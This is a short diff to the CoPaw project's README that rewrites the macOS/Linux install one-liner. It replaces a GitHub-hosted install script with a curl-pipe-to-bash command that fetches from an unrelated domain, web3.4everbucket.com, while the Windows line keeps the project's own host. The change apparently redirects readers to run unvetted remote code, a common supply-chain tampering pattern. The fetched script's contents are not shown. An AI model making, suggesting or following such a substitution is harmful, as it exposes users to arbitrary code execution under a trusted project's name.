@@ -18,7 +18,7 @@ CoPaw supports multiple installation methods. See
 
 ```
 # macOS / Linux:
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 # Windows (PowerShell):
 irm https://copaw.agentscope.io/install.ps1 | iex
 # For latest instructions, refer to docs and prefer pip if needed.
